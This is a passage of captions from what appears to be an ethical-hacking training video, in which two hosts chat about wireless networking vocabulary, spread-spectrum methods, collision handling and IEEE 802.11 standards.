ISM band is the\nfrequency range that we've set aside for\n\n180\n00:07:28.139 --> 00:07:31.016\nindustrial, scientific, and medical use.\n\n181\n00:07:31.016 --> 00:07:34.856\nInternationally kind of agreed to as\nbeing that range, or that frequency,\n\n182\n00:07:34.856 --> 00:07:36.482\nthat those devices will run on.\n\n183\n00:07:36.482 --> 00:07:39.669\nSo a lot of times when\nwe're thinking about SCADA,\n\n184\n00:07:39.669 --> 00:07:42.730\nSCADA depending where you come from,\nright?\n\n185\n00:07:42.730 --> 00:07:47.072\nEmbedded cyber physical systems,\nICS, industrial control.\n\n186\n00:07:47.072 --> 00:07:49.751\nIf we're running them wirelessly,\nwhich we should not be,\n\n187\n00:07:49.751 --> 00:07:52.072\nalthough we sometime will\ncertainly be these days.\n\n188\n00:07:52.072 --> 00:07:57.661\nBut if we are, more and more, as we cloud\nenable, IP enable, webify generically\n\n189\n00:07:57.661 --> 00:08:03.099\nthese systems which lead to a whole other\nhost of security issues and concerns.\n\n190\n00:08:03.099 --> 00:08:05.709\nWe are usually doing it\nacross the ISM band.\n\n191\n00:08:05.709 --> 00:08:06.929\nRight, more often than not.\n\n192\n00:08:06.929 --> 00:08:08.059\nSo just be aware of that.\n\n193\n00:08:08.059 --> 00:08:10.890\nAccess Point,\nwhere we often will commonly call an AP.\n\n194\n00:08:10.890 --> 00:08:12.910\nYou may actually, if you don't mind,\ncan you adjust that for us.\n\n195\n00:08:12.910 --> 00:08:14.100\n&gt;&gt; Sure.\n&gt;&gt; I forget to put that in.\n\n196\n00:08:14.100 --> 00:08:18.310\nI don't often use acronyms, certainly\nunless we define them, first of all.\n\n197\n00:08:18.310 --> 00:08:21.900\nAnd we don't tend to put them in,\na lot of the time,\n\n198\n00:08:21.900 --> 00:08:24.930\nunless they are specific to\nknowledge you may have for the exam.\n\n199\n00:08:24.930 --> 00:08:28.490\nYou would tend to see something like\nan access point spelled out, but every so\n\n200\n00:08:28.490 --> 00:08:31.105\noften you see it referred to\ngenerically as just an AP.\n\n201\n00:08:31.105 --> 00:08:35.365\nSo you just wanna know that rogue\naccess points are called RAPs, right?\n\n202\n00:08:35.365 --> 00:08:38.705\nWe throw down a RAP,\nwe throw down a rogue access point, right?\n\n203\n00:08:38.705 --> 00:08:40.125\nAll right, so anyway.\n\n204\n00:08:40.125 --> 00:08:43.919\nSo an access point is used to connect\nwireless devices to a wireless network.\n\n205\n00:08:43.919 --> 00:08:46.077\nAnd what people often\nforget about wireless, and\n\n206\n00:08:46.077 --> 00:08:48.567\nI remind people about this\nwhen we talk about it,\n\n207\n00:08:48.567 --> 00:08:53.957\nis that wireless networks are wired, and\nwireless, and they are hybrids, right?\n\n208\n00:08:53.957 --> 00:08:56.588\nBecause you always have\na back end cable somewhere,\n\n209\n00:08:56.588 --> 00:09:00.328\nthey're coming into or\nout of an access point, right?\n\n210\n00:09:00.328 --> 00:09:02.628\nDepending on how you look at,\nfrom the direction and the flow and\n\n211\n00:09:02.628 --> 00:09:03.328\nthe architecture.\n\n212\n00:09:03.328 --> 00:09:06.268\nBut those access points\nare tethered somewhere, right?\n\n213\n00:09:06.268 --> 00:09:08.418\n&gt;&gt; Yes.\n&gt;&gt; And they have to connect back to wired\n\n214\n00:09:08.418 --> 00:09:12.300\ninfrastructure Unless you\nare just simply running totally\n\n215\n00:09:12.300 --> 00:09:17.200\nan isolated wireless network with no\nbackbone, no tie in to anything else.\n\n216\n00:09:17.200 --> 00:09:21.122\nAnd you could do that in theory,\nbut it's for very limited use and\n\n217\n00:09:21.122 --> 00:09:22.990\nfor very small environments.\n\n218\n00:09:22.990 --> 00:09:25.240\nBut other then that, there is a tie in.\n\n219\n00:09:25.240 --> 00:09:26.793\nEssentially, if you think\nabout your home network for\n\n220\n00:09:26.793 --> 00:09:28.040\ninstance Inference that's right.\n\n221\n00:09:28.040 --> 00:09:31.380\nYou're connecting your cable box,\ncable modem, whatever they give you,\n\n222\n00:09:31.380 --> 00:09:34.950\nwireless all in one kind of\nMacgyver device these days, right?\n\n223\n00:09:34.950 --> 00:09:37.767\nYou're connecting that up to a cable\nthat's gonna be the cable line,\n\n224\n00:09:37.767 --> 00:09:38.734\nessentially, right?\n\n225\n00:09:38.734 --> 00:09:40.565\nOr whatever that is to go out.\n\n226\n00:09:40.565 --> 00:09:44.905\nSo you wanna think about the fact that we\noften talk about wireless networks, but\n\n227\n00:09:44.905 --> 00:09:47.775\nwe really mean a wireless wired hybrid.\n\n228\n00:09:47.775 --> 00:09:50.555\nAnd that's the traditional,\nnot only home use, but\n\n229\n00:09:50.555 --> 00:09:54.037\nthat is the traditional organization or\nenterprise use of wireless.\n\n230\n00:09:54.037 --> 00:09:58.027\nAnd that leads to some interesting\nconversations with regards to concerns\n\n231\n00:09:58.027 --> 00:10:01.267\naround security and hacking, because\nwe now have to think about the physical\n\n232\n00:10:01.267 --> 00:10:05.780\nsecurity we implement, and the logical\nlayers we build on the wired networks\n\n233\n00:10:05.780 --> 00:10:09.190\nas an extension of that security\ninto the wireless portion.\n\n234\n00:10:09.190 --> 00:10:11.500\nAnd if we're not good at\nthe basic blocking and\n\n235\n00:10:11.500 --> 00:10:15.980\ntackling of security in that space,\nin the wired space, right?\n\n236\n00:10:15.980 --> 00:10:19.470\nThe traditional Ethernet part of our\nnetwork that we often think about and\n\n237\n00:10:19.470 --> 00:10:21.560\ntalk about as the corporate LAN.\n\n238\n00:10:21.560 --> 00:10:23.420\n&gt;&gt; If we're not good there,\nif we're not tight there,\n\n239\n00:10:23.420 --> 00:10:27.460\nif we have not built our protection\nperimeter and our secure enclaves and\n\n240\n00:10:27.460 --> 00:10:31.000\nour trust zones, and all the language and\nstuff we talk about, right?\n\n241\n00:10:31.000 --> 00:10:35.320\nIf we don't have all that, then our\nwireless security could be super tight,\n\n242\n00:10:35.320 --> 00:10:39.720\nand the second we hit the wire,\nwe're probably hackable and exposed,\n\n243\n00:10:39.720 --> 00:10:41.140\nand most likely compromised.\n\n244\n00:10:41.140 --> 00:10:44.020\nAnd those compromises will simply\nfeed backwards and backfill\n\n245\n00:10:44.020 --> 00:10:47.430\ninto the wireless environment, which\ncan be a very significant challenge for\n\n246\n00:10:47.430 --> 00:10:49.600\nus if we don't architect\nthis the right way.\n\n247\n00:10:49.600 --> 00:10:50.790\nSo just think about that, right?\n\n248\n00:10:50.790 --> 00:10:51.772\nAnd you obviously know that.\n\n249\n00:10:51.772 --> 00:10:54.960\nAll right, so\njust thinking about that, hotspots,\n\n250\n00:10:54.960 --> 00:10:58.460\nplaces where wireless networks\nare available, typically for public use.\n\n251\n00:10:58.460 --> 00:11:02.450\nKeep in mind that we may provide guest\nwireless access in corporate LANs, right?\n\n252\n00:11:02.450 --> 00:11:03.330\nTraditionally, we often do.\n\n253\n00:11:03.330 --> 00:11:06.160\nAnd so you may have a hotspot concept\n\n254\n00:11:06.160 --> 00:11:09.710\nin the corporate network just sitting\ninside the organization, right?\n\n255\n00:11:09.710 --> 00:11:13.000\nBut essentially, it's a public,\nopen wi-fi capability.\n\n256\n00:11:13.000 --> 00:11:15.687\nOr your next door neighbor in theory,\nin the office, right?\n\n257\n00:11:15.687 --> 00:11:17.143\n&gt;&gt; [LAUGH]\n&gt;&gt; Or wherever, right?\n\n258\n00:11:17.143 --> 00:11:20.467\nMaybe doing that, and\nyou obviously may either, may or may not,\n\n259\n00:11:20.467 --> 00:11:24.250\nhave the benefit of that,\nwe just wanna understand that of course.\n\n260\n00:11:24.250 --> 00:11:28.312\nHow would we've gotten through college if\nthat wasn't for publicly available WiFi,\n\n261\n00:11:28.312 --> 00:11:29.600\nand the ability to borrow?\n\n262\n00:11:29.600 --> 00:11:31.848\nAnd I'm gonna say borrow with air quotes-\n&gt;&gt; [LAUGH]\n\n263\n00:11:31.848 --> 00:11:33.182\n&gt;&gt; I'm gonna use two air quotes, right?\n\n264\n00:11:33.182 --> 00:11:33.829\nWith double thumb hooks, right?\n\n265\n00:11:33.829 --> 00:11:34.529\nTwo, sounds like a goal.\n\n266\n00:11:34.529 --> 00:11:35.763\nSo that's a double, right?\n\n267\n00:11:35.763 --> 00:11:36.269\n&gt;&gt; Nice.\n\n268\n00:11:36.269 --> 00:11:41.351\n&gt;&gt; I'm gonna say borrow for cable and\nwireless, because back in the day,\n\n269\n00:11:41.351 --> 00:11:45.350\nnot that I ever, not me,\ncuz that's not how I roll.\n\n270\n00:11:45.350 --> 00:11:49.179\nBut I've been told,\nI've heard that people may at some point-\n\n271\n00:11:49.179 --> 00:11:51.000\n&gt;&gt; Plausible deniability, right?\n\n272\n00:11:51.000 --> 00:11:52.170\n&gt;&gt; Total deniability.\n\n273\n00:11:52.170 --> 00:11:54.510\nI was never there,\nI never went to college.\n\n274\n00:11:54.510 --> 00:11:55.585\nI don't know what you're talking about.\n\n275\n00:11:55.585 --> 00:11:59.030\nBut theoretically, I've been told\nthat you could borrow cable.\n\n276\n00:11:59.030 --> 00:12:00.530\n&gt;&gt; Yes.\n&gt;&gt; And you may be able to borrow wireless\n\n277\n00:12:00.530 --> 00:12:02.420\nas a result of that or vice versa.\n\n278\n00:12:02.420 --> 00:12:06.170\nBut borrowing cable, I heard, was all the\nrage at certain points back in the day.\n\n279\n00:12:06.170 --> 00:12:08.170\nAnd so\nhow would you have ever gotten through?\n\n280\n00:12:08.170 --> 00:12:09.530\n&gt;&gt; I wouldn't have made it.\n\n281\n00:12:09.530 --> 00:12:11.032\n&gt;&gt; I just, yeah, I don't know.\n\n282\n00:12:11.032 --> 00:12:14.540\nI mean, there was only so\nmuch studying and drinking you could do\n\n283\n00:12:14.540 --> 00:12:17.800\nwith regards to college before\nyou had to do something else.\n\n284\n00:12:17.800 --> 00:12:19.530\nAll right, anyway, we digress.\n\n285\n00:12:19.530 --> 00:12:20.990\nSo, let's get back to where we were.\n\n286\n00:12:20.990 --> 00:12:22.530\nSo, association, right?\n\n287\n00:12:22.530 --> 00:12:25.610\nThis is the process of connecting the\nwireless device up to the access point.\n\n288\n00:12:25.610 --> 00:12:27.265\nThis is also essentially shaking hands,\n\n289\n00:12:27.265 --> 00:12:29.500\nagreeing to do business with each other,\nright?\n\n290\n00:12:29.500 --> 00:12:33.610\nSo when we associate, we are, whatever the\nrequirements are to on-board, essentially,\n\n291\n00:12:33.610 --> 00:12:37.260\nand join and then use the device, rather\njoin the device to the access point.\n\n292\n00:12:37.260 --> 00:12:38.940\nJoining the wireless network securely.\n\n293\n00:12:38.940 --> 00:12:40.040\nTypically, more often than not,\n\n294\n00:12:40.040 --> 00:12:44.520\nunless it is totally open, this will\ninvolve identification of the SSID,\n\n295\n00:12:44.520 --> 00:12:47.310\nand most likely a network key\nof some kind, a security key,\n\n296\n00:12:47.310 --> 00:12:51.450\ndepending on the nature of the protocol\nand the security that's being implemented.\n\n297\n00:12:51.450 --> 00:12:56.174\nThen we have some different mechanisms\nthat are used traditionally,\n\n298\n00:12:56.174 --> 00:13:00.497\nagain with wireless, to be able\nto specify the way we connect and\n\n299\n00:13:00.497 --> 00:13:05.622\nthe way we manage the signal and\nthe amount of time, energy, and difficulty\n\n300\n00:13:05.622 --> 00:13:10.615\nwe put in with regards to manipulating\nchannels and sequencing, right?\n\n301\n00:13:10.615 --> 00:13:12.330\nIn order to be able to\nmove traffic around.\n\n302\n00:13:12.330 --> 00:13:15.963\nWe have OFDM, orthogonal\nfrequency-division multiplexing,\n\n303\n00:13:15.963 --> 00:13:20.920\ndirect-sequence spread spectrum,\nwhat's called D triple S, or DSSS.\n\n304\n00:13:20.920 --> 00:13:22.690\nAnd then we also, at the bottom there,\n\n305\n00:13:22.690 --> 00:13:26.230\nI believe have frequency-hopping\nspread spectrum, FHSS.\n\n306\n00:13:26.230 --> 00:13:30.368\nThese are all just different methods,\nultimately, of encoding digital data and\n\n307\n00:13:30.368 --> 00:13:35.630\nor signals, and then making them available\nthrough manipulation either of the actual\n\n308\n00:13:35.630 --> 00:13:40.650\nfrequency itself, carving or\nsegmenting that overall frequency.\n\n309\n00:13:40.650 --> 00:13:43.200\nImagine 94 gigahertz, hypothetically.\n\n310\n00:13:43.200 --> 00:13:48.600\nAnd between 94 and 95,\nwe would have 94.1, 94.2, and 94.3.\n\n311\n00:13:48.600 --> 00:13:52.180\nSo we could carve off those signal,\nsub-signal areas, and\n\n312\n00:13:52.180 --> 00:13:56.120\nwe could direct traffic into them by\nblocking them and creating cell sizes and\n\n313\n00:13:56.120 --> 00:13:57.820\nthings like that that we can manipulate.\n\n314\n00:13:57.820 --> 00:14:02.310\nWe may jump between frequency ranges,\nwhole frequencies or sub-frequencies,\n\n315\n00:14:02.310 --> 00:14:06.480\nto be able to spread our signal and\nspend five seconds,\n\n316\n00:14:06.480 --> 00:14:10.430\ntwo seconds, 20 seconds, whatever\nthe case may be, on each one of them.\n\n317\n00:14:10.430 --> 00:14:12.990\nSo that way, even if we are interfered\nwith, we're only interfered with for\n\n318\n00:14:12.990 --> 00:14:14.180\na very short amount of time, right?\n\n319\n00:14:14.180 --> 00:14:19.050\nSo as a result, the transmission overall\nwill probably still be viable and good.\n\n320\n00:14:19.050 --> 00:14:20.860\nSo there's different ways to do this.\n\n321\n00:14:20.860 --> 00:14:24.655\nIt's really just a matter of deciding\nwhat the best mechanism are.\n\n322\n00:14:24.655 --> 00:14:26.552\nThese are three traditional ones.\n\n323\n00:14:26.552 --> 00:14:29.969\nThere are some others that play off these,\nas riffs if you will,\n\n324\n00:14:29.969 --> 00:14:31.499\nadditional capabilities.\n\n325\n00:14:31.499 --> 00:14:34.167\nBut these are the common\nones that we often see.\n\n326\n00:14:34.167 --> 00:14:35.862\nSo, just wanna be aware of these.\n\n327\n00:14:35.862 --> 00:14:37.912\nThink of them, again,\nas vocabulary terminology, and\n\n328\n00:14:37.912 --> 00:14:39.458\njust have sense of how they come together.\n\n329\n00:14:39.458 --> 00:14:40.518\nDid you wanna say something?\n\n330\n00:14:40.518 --> 00:14:42.494\nI didn't mean to cut you off-\n&gt;&gt; No, no, no.\n\n331\n00:14:42.494 --> 00:14:44.832\n&gt;&gt; Or something\n&gt;&gt; Well, I was thinking these methods,\n\n332\n00:14:44.832 --> 00:14:46.478\nyou get a couple benefits, right?\n\n333\n00:14:46.478 --> 00:14:48.149\nYou get the, as you were saying,\n\n334\n00:14:48.149 --> 00:14:51.194\nif you got a bit of interference\nin one of those frequencies,\n\n335\n00:14:51.194 --> 00:14:55.740\nif you're jumping around, like you said,\nmaybe just a short time of interference.\n\n336\n00:14:55.740 --> 00:14:57.750\nAnd the other was-\n&gt;&gt; And this is typically in milliseconds,\n\n337\n00:14:57.750 --> 00:14:58.250\nby the way, right?\n\n338\n00:14:58.250 --> 00:15:01.290\nSo, we're not talking about, I say 0.25\nseconds, just to give you a sense.\n\n339\n00:15:01.290 --> 00:15:05.180\nBut reality is, you're jumping in\na predetermined amount of time,\n\n340\n00:15:05.180 --> 00:15:06.810\ntypically done with milliseconds.\n\n341\n00:15:06.810 --> 00:15:10.852\nSo even if there's interference,\nyou may be on a channel for five, 10,\n\n342\n00:15:10.852 --> 00:15:13.480\n20 milliseconds, constantly cycling.\n\n343\n00:15:13.480 --> 00:15:14.250\nAnd as a result of that,\n\n344\n00:15:14.250 --> 00:15:16.415\nyou're not gonna experience a very\nlarge amount of interference.\n\n345\n00:15:16.415 --> 00:15:18.764\nAnd latency doesn't become a big\nissue as a result of packet loss.\n\n346\n00:15:18.764 --> 00:15:21.495\n&gt;&gt; Does it impact the security at all?\n\n347\n00:15:21.495 --> 00:15:23.065\nDoes it make it more difficult for\nsomebody,\n\n348\n00:15:23.065 --> 00:15:25.745\ncuz they gotta know what\nfrequency you're going to next?\n\n349\n00:15:25.745 --> 00:15:29.966\n&gt;&gt; They do, so it can be more difficult\nto overall gain access to the signal and\n\n350\n00:15:29.966 --> 00:15:33.919\ndecode it and understand it,\nbecause now we have the random element of\n\n351\n00:15:33.919 --> 00:15:37.320\nthe sequencing hop and\nthe predetermined hop count.\n\n352\n00:15:37.320 --> 00:15:39.870\nMeaning, the actual sequence\nof channels we jump to.\n\n353\n00:15:39.870 --> 00:15:42.660\nWe go one, three, five,\nseven back to two, for, whatever.\n\n354\n00:15:42.660 --> 00:15:44.120\n&gt;&gt; Right.\n&gt;&gt; Within the sub-division\n\n355\n00:15:44.120 --> 00:15:47.950\nof that frequency, so\nit would be a little bit more challenging.\n\n356\n00:15:47.950 --> 00:15:51.720\nWe obviously have wireless scanners in\nsystems that can predetermine this and\n\n357\n00:15:51.720 --> 00:15:55.270\nunderstand this and look at it,\nbased on scanning a bunch of traffic for\n\n358\n00:15:55.270 --> 00:15:57.690\na period of time,\nseeing the frequency pattern.\n\n359\n00:15:57.690 --> 00:16:00.080\nAnd then we can decode it base on that.\n\n360\n00:16:00.080 --> 00:16:02.247\nThere's more to it than that,\nI'm over-simplifying.\n\n361\n00:16:02.247 --> 00:16:06.845\nBut because we do use a narrowly defined\nbandwidth range, or frequency range,\n\n362\n00:16:06.845 --> 00:16:11.580\nI shouldn't bandwidth range Frequency\nrange, let me be precise, to transmit,\n\n363\n00:16:11.580 --> 00:16:15.720\nagain, think of 94 gigahertz and\nbetween 94 and 95 is our range.\n\n364\n00:16:15.720 --> 00:16:18.470\nWe don't transmit at this range, by\nthe way, I'm just using it as an example,\n\n365\n00:16:18.470 --> 00:16:19.890\njust to be clear.\n\n366\n00:16:19.890 --> 00:16:24.960\nBut between 94 and 95 gigahertz, we would\nsubdivide that channel set into let's say,\n\n367\n00:16:24.960 --> 00:16:28.310\nten channels or whatever it is,\nfrom zero to nine.\n\n368\n00:16:28.310 --> 00:16:30.930\nAnd as a result of that, there's only so\nmany possibilities, right?\n\n369\n00:16:30.930 --> 00:16:33.130\nAnd we can only hop in so many ways.\n\n370\n00:16:33.130 --> 00:16:37.760\nThere are thousands of permutations,\nbut by scanning the network, listening,\n\n371\n00:16:37.760 --> 00:16:39.780\nlooking at that traffic flow coming in,\n\n372\n00:16:39.780 --> 00:16:41.840\nwe can start to see what\nthe pattern looks like.\n\n373\n00:16:41.840 --> 00:16:44.180\nAnd As we've talked\nabout with cryptography.\n\n374\n00:16:44.180 --> 00:16:47.920\nAnd as we've essentially just mentioned\neverywhere in everyone of these\n\n375\n00:16:47.920 --> 00:16:53.100\ndiscussions across the CEH set\nof sessions, that we've done or\n\n376\n00:16:53.100 --> 00:16:56.040\nset of episodes, that we've done and\nall the different topic areas.\n\n377\n00:16:56.040 --> 00:16:58.600\nAnytime we have a pattern\nregardless of what that pattern is,\n\n378\n00:16:58.600 --> 00:16:59.650\nregardless of what it may.\n\n379\n00:16:59.650 --> 00:17:01.510\nShow any time we have a pattern,\n\n380\n00:17:01.510 --> 00:17:05.230\nsameness kills right is really what\nthe operational thought process is.\n\n381\n00:17:05.230 --> 00:17:06.470\nThe more we can obfuscate and\n\n382\n00:17:06.470 --> 00:17:09.020\nhide that pattern the better we\nare from a security standpoint.\n\n383\n00:17:09.020 --> 00:17:11.580\nThe less likely it is\nsomebody can gain advantage\n\n384\n00:17:11.580 --> 00:17:14.440\nas a result of figuring out the kind of\nstuff you were just mentioning absolutely.\n\n385\n00:17:14.440 --> 00:17:15.000\n&gt;&gt; Okay yep.\n\n386\n00:17:17.010 --> 00:17:19.590\n&gt;&gt; All right, so we're not gonna get there\nyet let's leave that up we're definitely\n\n387\n00:17:19.590 --> 00:17:21.850\ngonna come there in a minute but\n&gt;&gt; Let's just talk for\n\n388\n00:17:21.850 --> 00:17:23.970\na minute just broadly\nabout wireless networks.\n\n389\n00:17:23.970 --> 00:17:26.880\nSo, let's think about, yeah,\nlet's go back and hello, how are you?\n\n390\n00:17:26.880 --> 00:17:28.250\nNice to see everybody.\n\n391\n00:17:28.250 --> 00:17:29.370\nWelcome to the studio.\n\n392\n00:17:29.370 --> 00:17:31.010\nNice to see all of you.\n\n393\n00:17:31.010 --> 00:17:32.850\nSo, when we think about wireless,\n\n394\n00:17:32.850 --> 00:17:35.510\nwe kind of set out the parameters\nin terms of vocabulary.\n\n395\n00:17:35.510 --> 00:17:38.690\nBut Leo, let's step back and talk about\nwhat the advantages of wireless are.\n\n396\n00:17:38.690 --> 00:17:41.270\nSo we were kidding around before about\nbeing able to borrow signals and\n\n397\n00:17:41.270 --> 00:17:41.840\nthings like that.\n\n398\n00:17:41.840 --> 00:17:46.420\nBut if you think about one of the key\nadvantages wireless networks give us.\n\n399\n00:17:46.420 --> 00:17:50.800\nWe often think about the fact that users\nare able to be more mobile right, so\n\n400\n00:17:50.800 --> 00:17:53.190\nthat they can move around a lot\nof the time they're tethered as,\n\n401\n00:17:53.190 --> 00:17:56.790\nwe often say to a desktop or whatever\nthey maybe if they're capable then.\n\n402\n00:17:56.790 --> 00:17:58.520\nSo then there is that advantage.\n\n403\n00:17:58.520 --> 00:18:02.320\nAdditional devices can be brought in\nthat are not normally able to be cabled\n\n404\n00:18:02.320 --> 00:18:03.220\nup directly.\n\n405\n00:18:03.220 --> 00:18:08.230\nTablet devices today, cell phones today,\ncertainly smart devices of any kind,\n\n406\n00:18:08.230 --> 00:18:12.650\nanything that will not have a direct\nconnect opportunity can be brought in and\n\n407\n00:18:12.650 --> 00:18:14.420\nbrought online and home for instance.\n\n408\n00:18:14.420 --> 00:18:16.880\nProbably your more modern TV's.\n\n409\n00:18:16.880 --> 00:18:21.820\nYour smart TV's, internet capable TV's are\nbeing set up and probably more often than\n\n410\n00:18:21.820 --> 00:18:25.430\nnot connected wirelessly to your home\ncable router, or whatever you may have.\n\n411\n00:18:25.430 --> 00:18:28.460\nAlthough there usually is at least in some\nof the older models as they crossed over,\n\n412\n00:18:28.460 --> 00:18:30.080\nyou would have the ethernet jack right,\n\n413\n00:18:30.080 --> 00:18:32.270\nbut you're not typically\njust doing it wirelessly.\n\n414\n00:18:32.270 --> 00:18:36.250\nSo You know, there's a lot of\nopportunity for wireless with regards to\n\n415\n00:18:36.250 --> 00:18:39.620\nsharing information but what are the\ndownsides as we talk about my interest?\n\n416\n00:18:39.620 --> 00:18:44.370\nYou'll explain or have helped us to\nunderstand and help me to then focused in\n\n417\n00:18:44.370 --> 00:18:47.110\non the explanation of the fact that you\nknow there, maybe opportunities there for\n\n418\n00:18:47.110 --> 00:18:49.970\nyou but a hack wireless single\nis a result of what we do, and\n\n419\n00:18:49.970 --> 00:18:53.410\nhow we do it so wanna keep in\nmind that for every advantage.\n\n420\n00:18:53.410 --> 00:18:55.370\nRight, there's always\npotentially a negative and\n\n421\n00:18:55.370 --> 00:18:56.830\nwe have to balance that, right?\n\n422\n00:18:56.830 --> 00:18:59.210\nYour wireless signals may not be\nas strong, it may not be as clear,\n\n423\n00:18:59.210 --> 00:19:03.140\nit may not be as fast they definitely are\nnot as fast as being on the cable, right?\n\n424\n00:19:03.140 --> 00:19:06.630\nWhen was the last time you got\ngigabit on a wireless, right?\n\n425\n00:19:06.630 --> 00:19:10.650\nNot typically happening very often so\nas a result to that, you know, their gonna\n\n426\n00:19:10.650 --> 00:19:14.060\nperhaps not gonna meet the expectations\nof users for certain applications.\n\n427\n00:19:14.060 --> 00:19:18.070\nI would not want to be streaming\na large file at a very\n\n428\n00:19:18.070 --> 00:19:20.310\nquick turnaround time\non a wireless network.\n\n429\n00:19:20.310 --> 00:19:23.230\nI want do that on a wire network right\nbecause I'm gonna get the benefit of\n\n430\n00:19:23.230 --> 00:19:27.020\nthe gig the bandwidth capability, or\nthat are part of a gigabit anyways,\n\n431\n00:19:27.020 --> 00:19:32.560\nversus the 11 megabytes, or 54 megabytes,\nor whatever it may be on wireless.\n\n432\n00:19:32.560 --> 00:19:35.370\n&gt;&gt; Yeah, there's several times here\nin the office, I connect wirelessly,\n\n433\n00:19:35.370 --> 00:19:38.910\nit's simple and easy, but\n&gt;&gt; If I'm gonna start moving a VHD,\n\n434\n00:19:38.910 --> 00:19:43.970\na virtual machines hard drive,\nthat 60, 80 gigs in size, I go find\n\n435\n00:19:43.970 --> 00:19:47.100\na jack somewhere and plug in cuz I'm not\ngonna send that over my wireless network.\n\n436\n00:19:47.100 --> 00:19:47.830\n&gt;&gt; You don't find an intern?\n\n437\n00:19:47.830 --> 00:19:49.000\nThe interns are good for that, right.\n\n438\n00:19:49.000 --> 00:19:50.550\nI thought that's why we have interns.\n\n439\n00:19:50.550 --> 00:19:54.970\nAt least that's why I would think that\nthey should exist cuz that's what they do.\n\n440\n00:19:54.970 --> 00:19:55.930\n&gt;&gt; We need more of them then.\n\n441\n00:19:55.930 --> 00:19:57.120\n&gt;&gt; We need you to move that for me, right.\n\n442\n00:19:57.120 --> 00:19:59.340\nRight, this is what you do\nto learn how to do things.\n\n443\n00:19:59.340 --> 00:20:01.730\nI am joking, by the way, just to be clear.\n\n444\n00:20:01.730 --> 00:20:05.040\nThat is not what interns are for,\nnot at all, not even close.\n\n445\n00:20:05.040 --> 00:20:08.000\nAnd it si very important,\nby the way, the point Mike makes,\n\n446\n00:20:08.000 --> 00:20:10.360\nnot about the interns but the other point.\n\n447\n00:20:10.360 --> 00:20:14.959\nWhich is that you definitely from\nthe perspective of usability.\n\n448\n00:20:15.960 --> 00:20:19.850\n&gt;&gt; From the perspective of obviously you\nknow quick turn around, but also from\n\n449\n00:20:19.850 --> 00:20:24.200\nthe perspective of making sure that and\nit's an interesting dichotomy right?\n\n450\n00:20:24.200 --> 00:20:25.190\nBecause when we think about error\n\n451\n00:20:25.190 --> 00:20:25.920\ncontrol and correct\n&gt;&gt; Yes.\n\n452\n00:20:25.920 --> 00:20:29.040\n&gt;&gt; we think about access on\nwireless versus wired networks.\n\n453\n00:20:29.040 --> 00:20:32.180\nWe use carrier sense multiple\naccess collision detection on wire.\n\n454\n00:20:32.180 --> 00:20:35.120\nWe use carrier sense multiple\naccess collision avoidance\n\n455\n00:20:35.120 --> 00:20:37.930\n&gt;&gt; On wireless and collision avoidance is\n\n456\n00:20:37.930 --> 00:20:42.140\nactually better system because we\ndon't typically have collision,\n\n457\n00:20:42.140 --> 00:20:45.780\nbecause we're very polite and civil we ask\npermission before we actually sent, but\n\n458\n00:20:45.780 --> 00:20:49.420\nthe downside we loose bandwidths\nHead to manage the setup, right?\n\n459\n00:20:49.420 --> 00:20:50.910\nSo there's a tradeoff there.\n\n460\n00:20:50.910 --> 00:20:53.760\nBut the system is actually less\nerror prone, believe it or\n\n461\n00:20:53.760 --> 00:20:54.380\nnot-\n&gt;&gt; Mm-hm.\n\n462\n00:20:54.380 --> 00:20:55.730\n&gt;&gt; On wireless than it is on the wire.\n\n463\n00:20:55.730 --> 00:20:58.060\nWe have less collisions\ntherefore less resets.\n\n464\n00:20:58.060 --> 00:21:00.790\nSo there is a slight tradeoff just\nfrom a performance stand point, but\n\n465\n00:21:00.790 --> 00:21:03.390\nalso from a viability of getting\nthe bits where they need to be.\n\n466\n00:21:03.390 --> 00:21:09.550\nNow we do manage that on the wired side\nwith TCP to resend, send and acknowledge.\n\n467\n00:21:09.550 --> 00:21:14.240\nAnd all that, so I mean it's not, I would\nsay, a solution where we have to say, wow.\n\n468\n00:21:14.240 --> 00:21:17.570\nBecause of error control and\nloss of packets, I must go wireless and\n\n469\n00:21:17.570 --> 00:21:21.740\nI'll live with the fact that\nthe speed is less than adequate.\n\n470\n00:21:21.740 --> 00:21:24.870\nI'm just pointing out that when you start\nto really dig into the technologies.\n\n471\n00:21:24.870 --> 00:21:27.120\nIt's interesting that's subtle to exist,\n\n472\n00:21:27.120 --> 00:21:30.630\nwe can play off each other there a little\nbit to better understand what's going on.\n\n473\n00:21:30.630 --> 00:21:32.360\nSo just, just something to think about.\n\n474\n00:21:32.360 --> 00:21:33.000\nThat's all.\n\n475\n00:21:33.000 --> 00:21:34.690\nAnyway, let's do the following.\n\n476\n00:21:34.690 --> 00:21:37.150\nI know we have a table you created.\n\n477\n00:21:37.150 --> 00:21:38.025\n&gt;&gt; I did.\nDo the first one,\n\n478\n00:21:38.025 --> 00:21:39.315\nthe wireless standards tables.\n\n479\n00:21:39.315 --> 00:21:42.585\nI just want to summarize some of the\nwireless standards out there that wireless\n\n480\n00:21:42.585 --> 00:21:43.945\nis not just wireless.\n\n481\n00:21:43.945 --> 00:21:48.425\nAnd wireless is actually as you can see\nmade up of a lot of different standards.\n\n482\n00:21:48.425 --> 00:21:50.500\nNow what I did not have you do With this,\nso\n\n483\n00:21:50.500 --> 00:21:52.220\nmaybe we could do some real\ntime while I'm talking.\n\n484\n00:21:53.380 --> 00:21:56.180\nWe did not go out to\nthe I EEE web site and\n\n485\n00:21:56.180 --> 00:21:58.570\njust take a look at where\nthe standards come from.\n\n486\n00:21:58.570 --> 00:22:01.230\nSo maybe you could just post that\nup in the chat window separately.\n\n487\n00:22:01.230 --> 00:22:05.240\nJust give people the general\nworking group site for I EEE.\n\n488\n00:22:05.240 --> 00:22:09.880\nAll of these standards come from the I EEE\nas many of the standards we talk\n\n489\n00:22:09.880 --> 00:22:10.480\nabout do 802.\n\n490\n00:22:10.480 --> 00:22:14.727\nThree for ethernet 802.5 for token ring,\n802 dot whatever, [LAUGH] right?\n\n491\n00:22:14.727 --> 00:22:15.365\nFor all.\n&gt;&gt; [LAUGH]\n\n492\n00:22:15.365 --> 00:22:16.590\n&gt;&gt; .the different things\n\n493\n00:22:16.590 --> 00:22:17.550\nwe talk about\n&gt;&gt; 1x\n\n494\n00:22:17.550 --> 00:22:20.000\n&gt;&gt; Field end tagging.\n\n495\n00:22:20.000 --> 00:22:20.610\n1Q, right?\n&gt;&gt; Yup.\n\n496\n00:22:20.610 --> 00:22:22.470\n&gt;&gt; All the different\nstuff that's out there.\n\n497\n00:22:22.470 --> 00:22:24.480\nThere's just all sorts of them.\n\n498\n00:22:24.480 --> 00:22:26.540\nAnd the wireless standards, so\nthere you can see them on the 